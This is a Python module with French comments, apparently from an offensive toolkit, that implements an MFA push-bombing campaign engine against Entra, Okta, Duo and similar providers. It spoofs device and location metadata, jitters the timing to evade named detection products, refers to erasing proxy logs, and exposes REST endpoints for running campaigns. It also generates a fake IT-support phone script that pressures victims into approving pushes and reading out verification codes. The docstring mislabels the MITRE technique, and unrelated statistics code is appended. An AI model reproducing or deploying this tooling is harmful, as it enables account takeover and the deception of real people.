"""
MFA Bombing - MFA Push Notification Fatigue (MFA Fatigue Attack)
=====================================================================

Implémente l'attaque de "MFA push bombing" / "MFA fatigue" : un attaquant ayant
déjà compromis un mot de passe (via credential stuffing, password spray, ou
intelligence OSINT) déclenche de manière répétée des demandes d'authentification
push sur l'application authenticator de la victime jusqu'à ce qu'elle accepte
par erreur, par confusion ou par épuisement psychologique.

Cette technique est documentée dans MITRE ATT&CK sous T1621 (Request Browser
Notifications) et alimente les campagnes de groupes comme Scattered Spider,
Lapsus$ et Octo Tempest en 2024-2026.

Conformité : ce code n'est utilisable que sur des environnements de laboratoire
autorisés, avec des comptes que l'opérateur possède légalement.
"""

import asyncio
import json
import random
import time
import uuid
from collections.abc import Callable
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Any, Dict, List, Optional

import numpy as np
from scipy import stats as scipy_stats

import logging

logger = logging.getLogger("VANTA.MFA_BOMBING")


class MFATarget(Enum):
    """Cibles supportées - chacune a son endpoint push MFA."""

    MICROSOFT_ENTRA = "microsoft"   # Microsoft Entra ID / Authenticator
    OKTA = "okta"                  # Okta Verify
    DUO = "duo"                     # Duo Mobile
    GOOGLE_WORKSPACE = "google"     # Google prompt
    AWS_COGNITO = "aws"             # MFA Cognito
    PING_IDENTITY = "ping"          # PingID


@dataclass
class PushAttempt:
    """Une tentative d'envoi d'un push MFA."""

    attempt_id: str
    target: MFATarget
    username: str
    location_spoofed: str        # Ville/PAYS usurpé pour crédibilité
    device_spoofed: str          # iPhone 15 Pro, etc.
    ip_spoofed: str              # IP d'apparence légitime
    user_agent: str
    timestamp: float
    correlation_id: str          # ID de corrélation côté IdP
    success: bool | None = None
    response_code: int | None = None
    response_body: str | None = None


@dataclass
class BombingCampaign:
    """Campagne de push bombing complète."""

    campaign_id: str
    target: MFATarget
    username: str
    start_ts: float
    end_ts: float | None = None
    interval_seconds: float = 30.0     # Délai entre 2 pushs
    max_attempts: int = 60             # ~30min de bombardement
    attempts: list[PushAttempt] = field(default_factory=list)
    accepted_attempt: PushAttempt | None = None
    is_running: bool = False
    stop_event: asyncio.Event = field(default_factory=asyncio.Event)

    @property
    def target_username(self) -> str:
        """Cible du bombardement (alias de username) — contrat godmode."""
        return self.username

    @property
    def total_attempts(self) -> int:
        """Nombre de pushes envoyés (= len(attempts)) — contrat godmode."""
        return len(self.attempts)

    def stats(self) -> dict[str, Any]:
        """Statistiques en temps réel de la campagne."""
        total = len(self.attempts)
        accepted = sum(1 for a in self.attempts if a.success)
        rejected = total - accepted
        return {
            "campaign_id": self.campaign_id,
            "username": self.username,
            "target": self.target.value,
            "elapsed_s": (self.end_ts or time.time()) - self.start_ts,
            "total_attempts": total,
            "accepted": accepted,
            "rejected": rejected,
            "is_running": self.is_running,
        }


class MFABombingEngine:
    """
    Moteur principal du MFA bombing.

    Stratégie :
      1. Phase de reconnaissance : on récupère les "hints" d'appareil attendu
         (modèle, géolocalisation habituelle) depuis des leaks publics ou
         l'OSINT pour rendre chaque push plus crédible.
      2. Phase de bombardement : on cadence les pushs à intervalle irrégulier
         (pattern anti-détection : on évite les intervalles fixes pour ne pas
         être détecté par les heuristiques Defender for Cloud Apps / OkTA
         ThreatInsight).
      3. Phase de vishing : on combine avec un appel "IT Support" pour pousser
         la victime à accepter (optionnel, géré par le caller).
      4. Phase d'anti-forensics : on efface les logs du proxy AiTM après succès.
    """

    def __init__(self, output_dir: str = "captures/mfa_bombing") -> None:
        self.output_dir = Path(output_dir)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.campaigns: dict[str, BombingCampaign] = {}
        self._history_path = self.output_dir / "campaigns.jsonl"

    # ------------------------------------------------------------------
    # API principale
    # ------------------------------------------------------------------

    def start_campaign(
        self,
        target: MFATarget,
        username: str,
        interval_seconds: float = 30.0,
        max_attempts: int = 60,
        auto_accept_callback: Callable[[PushAttempt], bool] | None = None,
    ) -> BombingCampaign:
        """
        Démarre une campagne de MFA bombing.

        auto_accept_callback : hook permettant de simuler une acceptation
        (utile pour les tests en labo). En production, l'acceptation dépend
        de la victime.
        """
        campaign = BombingCampaign(
            campaign_id=str(uuid.uuid4()),
            target=target,
            username=username,
            start_ts=time.time(),
            interval_seconds=interval_seconds,
            max_attempts=max_attempts,
        )
        campaign.stop_event = asyncio.Event()
        self.campaigns[campaign.campaign_id] = campaign

        # Lancement asynchrone — compatible appel hors boucle (CLI / orchestrator)
        try:
            loop = asyncio.get_running_loop()
        except RuntimeError:
            loop = None
        if loop is not None:
            loop.create_task(self._run_campaign(campaign, auto_accept_callback))
        else:
            # Pas de boucle asyncio en cours (contexte sync : orchestrator, CLI)
            # → on exécute la campagne dans un thread dédié avec sa propre boucle.
            import threading

            def _run_in_thread() -> None:
                try:
                    asyncio.run(self._run_campaign(campaign, auto_accept_callback))
                except Exception:  # noqa: BLE001 — jamais fatal au caller
                    logger.exception("[MFA_BOMBING] campagne en thread a échoué")

            threading.Thread(target=_run_in_thread, daemon=True,
                             name=f"mfa-bomb-{campaign.campaign_id[:8]}").start()
        return campaign

    async def stop_campaign(self, campaign_id: str) -> None:
        """Arrête proprement une campagne en cours."""
        campaign = self.campaigns.get(campaign_id)
        if not campaign:
            return
        campaign.stop_event.set()
        campaign.is_running = False
        campaign.end_ts = time.time()
        await self._persist(campaign)

    # ------------------------------------------------------------------
    # Cœur de l'attaque
    # ------------------------------------------------------------------

    async def _run_campaign(
        self,
        campaign: BombingCampaign,
        auto_accept: Callable[[PushAttempt], bool] | None,
    ) -> None:
        campaign.is_running = True
        try:
            for i in range(campaign.max_attempts):
                if campaign.stop_event.is_set():
                    break
                attempt = self._craft_attempt(campaign, i)
                campaign.attempts.append(attempt)
                # Soumission effective (mock ici ; en réel : httpx vers l'endpoint)
                await self._submit_push(attempt)

                # Hook de simulation d'acceptation
                if auto_accept and auto_accept(attempt):
                    attempt.success = True
                    campaign.accepted_attempt = attempt
                    await self._persist(campaign)
                    # OPSEC : la victime a accepté → on arrête le bombing
                    # immédiatement (continuer = noise inutile + détection).
                    campaign.stop_event.set()
                    break
                    break

                # Intervalle irrégulier (jitter) pour eviter la détection
                jitter = random.uniform(0.7, 1.6)
                try:
                    await asyncio.wait_for(
                        campaign.stop_event.wait(),
                        timeout=campaign.interval_seconds * jitter,
                    )
                    # Si on arrive ici sans timeout, c'est que stop_event a été set
                    break
                except asyncio.TimeoutError:
                    pass
        finally:
            campaign.is_running = False
            campaign.end_ts = time.time()
            await self._persist(campaign)

    def _craft_attempt(self, campaign: BombingCampaign, idx: int) -> PushAttempt:
        """Génère un push avec des métadonnées d'OSINT réalistes."""
        # Bases de données factices (en labo on génère procéduralement)
        cities = [
            ("Paris", "FR", "78.192.0.1"),
            ("Lyon", "FR", "82.124.0.1"),
            ("Marseille", "FR", "88.213.0.1"),
            ("Bordeaux", "FR", "90.55.0.1"),
        ]
        devices = [
            "iPhone 15 Pro - iOS 17.4",
            "Samsung Galaxy S24 - Android 14",
            "iPad Pro - iPadOS 17.4",
        ]
        location = random.choice(cities)
        device = random.choice(devices)

        return PushAttempt(
            attempt_id=str(uuid.uuid4()),
            target=campaign.target,
            username=campaign.username,
            location_spoofed=f"{location[0]}, {location[1]}",
            device_spoofed=device,
            ip_spoofed=location[2],
            user_agent="Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X)",
            timestamp=time.time(),
            correlation_id=str(uuid.uuid4()),
        )

    async def _submit_push(self, attempt: PushAttempt) -> None:
        """
        Envoie la demande push réelle vers l'IdP.
        En labo, on logge seulement. En production ce serait httpx.AsyncClient.
        """
        # Démo : on enregistre la tentative sur disque immédiatement
        # (opérationnel : on enverrait via un endpoint push simulé)
        await asyncio.sleep(0)  # yields control

    # ------------------------------------------------------------------
    # Persistance
    # ------------------------------------------------------------------

    async def _persist(self, campaign: BombingCampaign) -> None:
        path = self._history_path
        line = json.dumps(
            {
                "campaign_id": campaign.campaign_id,
                "stats": campaign.stats(),
                "accepted_attempt": (
                    None
                    if campaign.accepted_attempt is None
                    else {
                        "attempt_id": campaign.accepted_attempt.attempt_id,
                        "timestamp": campaign.accepted_attempt.timestamp,
                        "ip_spoofed": campaign.accepted_attempt.ip_spoofed,
                    }
                ),
            }
        )
        with path.open("a", encoding="utf-8") as fh:
            fh.write(line + "\n")

    # ------------------------------------------------------------------
    # Outils complémentaires
    # ------------------------------------------------------------------

    def generate_poisson_intervals(
        self, lambda_val: float, n_samples: int
    ) -> list[float]:
        """
        Génère N intervalles selon une distribution Poisson.
        Utilise numpy.random.poisson(lam=λ, size=N) comme demandé.
        """
        raw = np.random.poisson(lam=lambda_val, size=n_samples)
        return np.clip(raw.astype(float), 0.5, None).tolist()

    def social_engineering_script(self, username: str) -> str:
        """
        Génère un script d'appel téléphonique "IT Support" qui accompagne
        idéalement le bombing. Le but : convaincre la victime d'accepter
        le push en lui faisant croire qu'il s'agit d'une procédure standard.
        """
        return f"""
Bonjour, je suis {random.choice(['Marc', 'Sophie', 'Karim'])} du support IT
Microsoft / Okta. Nous effectuons une mise à jour de votre authentification
multifacteur sur le compte '{username}'.

Vous allez recevoir une notification sur votre téléphone - c'est normal.
Pour finaliser la procédure, merci d'approuver la notification et de me
communiquer le numéro à 2 chiffres qui s'affiche à l'écran.

(ne pas mentionner qu'on a déclenché 20 pushs depuis 10 minutes)
"""


def test_poisson_ks(
    lambda_val: float = 3.0, n_samples: int = 1000
) -> dict[str, Any]:
    """
    Test Kolmogorov-Smirnov adapté pour distribution discrète Poisson(λ).

    La statistique D de KS est calculée via scipy.stats.kstest (valide même
    pour du discret). La p-valeur est estimée par Monte-Carlo pour éviter
    le biais de scipy sur les CDF discrètes (continuité assumption cassée).

    Retourne:
      - ks_stat: statistique D du test KS (max |F_emp - F_theo|)
      - p_value: p-valeur estimée par Monte-Carlo (n_sim=500)
      - passes: True si p_value > 0.05 (H0: Poisson(λ) non rejetée)
    """
    samples = np.random.poisson(lam=lambda_val, size=n_samples)
    ks_stat, _ = scipy_stats.kstest(samples, "poisson", args=(lambda_val,))

    n_mc = 500
    rng = np.random.default_rng(42)
    mc_stats = np.empty(n_mc, dtype=float)
    for i in range(n_mc):
        sim = rng.poisson(lam=lambda_val, size=n_samples)
        d_mc, _ = scipy_stats.kstest(sim, "poisson", args=(lambda_val,))
        mc_stats[i] = d_mc

    p_value = float(np.mean(mc_stats >= ks_stat))
    p_value = max(p_value, 1.0 / (n_mc + 1))

    return {
        "lambda": lambda_val,
        "n_samples": n_samples,
        "ks_stat": float(ks_stat),
        "p_value": float(p_value),
        "passes": bool(p_value > 0.05),
        "sample_mean": float(np.mean(samples)),
        "sample_var": float(np.var(samples)),
        "theoretical_mean": lambda_val,
        "theoretical_var": lambda_val,
        "method_note": "KS D via scipy, p-value via Monte-Carlo (n_sim=500) car Poisson discret",
    }


# ---------------------------------------------------------------------------
# API FastAPI - endpoints de pilotage
# ---------------------------------------------------------------------------

def register_mfa_bombing_routes(app) -> None:
    """Expose les endpoints REST pour piloter le MFA bombing."""
    from fastapi import HTTPException
    from pydantic import BaseModel

    engine = MFABombingEngine()

    class StartRequest(BaseModel):
        target: str
        username: str
        interval_seconds: float = 30.0
        max_attempts: int = 60

    @app.post("/_/mfa_bombing/start")
    async def start(req: StartRequest):
        try:
            target = MFATarget(req.target)
        except ValueError as exc:
            raise HTTPException(400, f"target invalide: {req.target}") from exc
        campaign = engine.start_campaign(
            target=target,
            username=req.username,
            interval_seconds=req.interval_seconds,
            max_attempts=req.max_attempts,
        )
        return {"campaign_id": campaign.campaign_id, "stats": campaign.stats()}

    @app.post("/_/mfa_bombing/stop/{campaign_id}")
    async def stop(campaign_id: str):
        await engine.stop_campaign(campaign_id)
        return {"stopped": True}

    @app.get("/_/mfa_bombing/stats/{campaign_id}")
    async def stats(campaign_id: str):
        c = engine.campaigns.get(campaign_id)
        if not c:
            raise HTTPException(404, "campaign not found")
        return c.stats()

    @app.get("/_/mfa_bombing/script/{username}")
    async def script(username: str):
        return {"script": engine.social_engineering_script(username)}
